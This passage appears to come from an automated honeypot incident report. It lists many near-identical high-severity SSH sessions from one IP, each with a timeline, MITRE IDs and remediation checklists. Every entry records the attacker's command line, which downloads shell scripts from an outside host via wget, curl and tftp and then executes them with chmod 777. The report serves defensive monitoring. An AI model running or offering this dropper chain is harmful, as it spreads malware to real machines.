|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:46` | `cowrie.session.connect` |
| `2026-08-25 09:55:46` | `cowrie.login.success` |
| `2026-08-25 09:55:47` | `cowrie.session.params` |
| `2026-08-25 09:55:47` | `cowrie.command.input` |
| `2026-08-25 09:55:47` | `cowrie.session.file_download` |
| `2026-08-25 09:55:47` | `cowrie.session.file_download` |
| `2026-08-25 09:55:47` | `cowrie.session.file_download` |
| `2026-08-25 09:55:48` | `cowrie.log.closed` |
| `2026-08-25 09:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50ed5f407549

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:48` | `cowrie.session.connect` |
| `2026-08-25 09:55:48` | `cowrie.login.success` |
| `2026-08-25 09:55:48` | `cowrie.session.params` |
| `2026-08-25 09:55:49` | `cowrie.command.input` |
| `2026-08-25 09:55:49` | `cowrie.session.file_download` |
| `2026-08-25 09:55:49` | `cowrie.session.file_download` |
| `2026-08-25 09:55:49` | `cowrie.log.closed` |
| `2026-08-25 09:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea88958b6a4e

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:49` | `cowrie.session.connect` |
| `2026-08-25 09:55:49` | `cowrie.login.success` |
| `2026-08-25 09:55:50` | `cowrie.session.params` |
| `2026-08-25 09:55:50` | `cowrie.command.input` |
| `2026-08-25 09:55:50` | `cowrie.command.success` |
| `2026-08-25 09:55:50` | `cowrie.session.file_download` |
| `2026-08-25 09:55:51` | `cowrie.log.closed` |
| `2026-08-25 09:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d789b5ce452

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:51` | `cowrie.session.connect` |
| `2026-08-25 09:55:51` | `cowrie.login.success` |
| `2026-08-25 09:55:52` | `cowrie.session.params` |
| `2026-08-25 09:55:52` | `cowrie.command.input` |
| `2026-08-25 09:55:52` | `cowrie.command.success` |
| `2026-08-25 09:55:52` | `cowrie.session.file_download` |
| `2026-08-25 09:55:52` | `cowrie.log.closed` |
| `2026-08-25 09:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-874d8bd38ac0

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:52` | `cowrie.session.connect` |
| `2026-08-25 09:55:53` | `cowrie.login.success` |
| `2026-08-25 09:55:53` | `cowrie.session.params` |
| `2026-08-25 09:55:53` | `cowrie.command.input` |
| `2026-08-25 09:55:53` | `cowrie.command.success` |
| `2026-08-25 09:55:54` | `cowrie.log.closed` |
| `2026-08-25 09:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c21da72feaaa

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:54` | `cowrie.session.connect` |
| `2026-08-25 09:55:54` | `cowrie.login.success` |
| `2026-08-25 09:55:55` | `cowrie.session.params` |
| `2026-08-25 09:55:55` | `cowrie.command.input` |
| `2026-08-25 09:55:55` | `cowrie.command.success` |
| `2026-08-25 09:55:55` | `cowrie.log.closed` |
| `2026-08-25 09:55:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e645b6733643

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:55` | `cowrie.session.connect` |
| `2026-08-25 09:55:55` | `cowrie.login.success` |
| `2026-08-25 09:55:56` | `cowrie.session.params` |
| `2026-08-25 09:55:56` | `cowrie.command.input` |
| `2026-08-25 09:55:56` | `cowrie.command.success` |
| `2026-08-25 09:55:57` | `cowrie.log.closed` |
| `2026-08-25 09:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cde94ecdd1d

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:57` | `cowrie.session.connect` |
| `2026-08-25 09:55:57` | `cowrie.login.success` |
| `2026-08-25 09:55:58` | `cowrie.session.params` |
| `2026-08-25 09:55:58` | `cowrie.command.input` |
| `2026-08-25 09:55:58` | `cowrie.command.success` |
| `2026-08-25 09:55:58` | `cowrie.log.closed` |
| `2026-08-25 09:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b11ab43fde77

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:55 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:55:58` | `cowrie.session.connect` |
| `2026-08-25 09:55:59` | `cowrie.login.success` |
| `2026-08-25 09:55:59` | `cowrie.session.params` |
| `2026-08-25 09:55:59` | `cowrie.command.input` |
| `2026-08-25 09:55:59` | `cowrie.command.success` |
| `2026-08-25 09:56:00` | `cowrie.log.closed` |
| `2026-08-25 09:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcc8f94f2799

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:00` | `cowrie.session.connect` |
| `2026-08-25 09:56:00` | `cowrie.login.success` |
| `2026-08-25 09:56:01` | `cowrie.session.params` |
| `2026-08-25 09:56:01` | `cowrie.command.input` |
| `2026-08-25 09:56:01` | `cowrie.command.success` |
| `2026-08-25 09:56:01` | `cowrie.log.closed` |
| `2026-08-25 09:56:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9f7f36185b1

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:01` | `cowrie.session.connect` |
| `2026-08-25 09:56:02` | `cowrie.login.success` |
| `2026-08-25 09:56:02` | `cowrie.session.params` |
| `2026-08-25 09:56:02` | `cowrie.command.input` |
| `2026-08-25 09:56:02` | `cowrie.command.success` |
| `2026-08-25 09:56:03` | `cowrie.log.closed` |
| `2026-08-25 09:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea21a6391143

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:03` | `cowrie.session.connect` |
| `2026-08-25 09:56:03` | `cowrie.login.success` |
| `2026-08-25 09:56:04` | `cowrie.session.params` |
| `2026-08-25 09:56:04` | `cowrie.command.input` |
| `2026-08-25 09:56:04` | `cowrie.command.success` |
| `2026-08-25 09:56:04` | `cowrie.log.closed` |
| `2026-08-25 09:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4594fab502cc

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:04` | `cowrie.session.connect` |
| `2026-08-25 09:56:05` | `cowrie.login.success` |
| `2026-08-25 09:56:05` | `cowrie.session.params` |
| `2026-08-25 09:56:05` | `cowrie.command.input` |
| `2026-08-25 09:56:05` | `cowrie.command.success` |
| `2026-08-25 09:56:06` | `cowrie.log.closed` |
| `2026-08-25 09:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8d54529d39

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:06` | `cowrie.session.connect` |
| `2026-08-25 09:56:06` | `cowrie.login.success` |
| `2026-08-25 09:56:07` | `cowrie.session.params` |
| `2026-08-25 09:56:07` | `cowrie.command.input` |
| `2026-08-25 09:56:07` | `cowrie.command.success` |
| `2026-08-25 09:56:07` | `cowrie.log.closed` |
| `2026-08-25 09:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d668e4e80f2f

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:07` | `cowrie.session.connect` |
| `2026-08-25 09:56:08` | `cowrie.login.success` |
| `2026-08-25 09:56:08` | `cowrie.session.params` |
| `2026-08-25 09:56:08` | `cowrie.command.input` |
| `2026-08-25 09:56:08` | `cowrie.command.success` |
| `2026-08-25 09:56:09` | `cowrie.log.closed` |
| `2026-08-25 09:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de5858c3bf28

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:09` | `cowrie.session.connect` |
| `2026-08-25 09:56:09` | `cowrie.login.success` |
| `2026-08-25 09:56:10` | `cowrie.session.params` |
| `2026-08-25 09:56:10` | `cowrie.command.input` |
| `2026-08-25 09:56:10` | `cowrie.command.success` |
| `2026-08-25 09:56:10` | `cowrie.log.closed` |
| `2026-08-25 09:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40533f13d79d

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:10` | `cowrie.session.connect` |
| `2026-08-25 09:56:11` | `cowrie.login.success` |
| `2026-08-25 09:56:11` | `cowrie.session.params` |
| `2026-08-25 09:56:11` | `cowrie.command.input` |
| `2026-08-25 09:56:11` | `cowrie.command.success` |
| `2026-08-25 09:56:12` | `cowrie.log.closed` |
| `2026-08-25 09:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
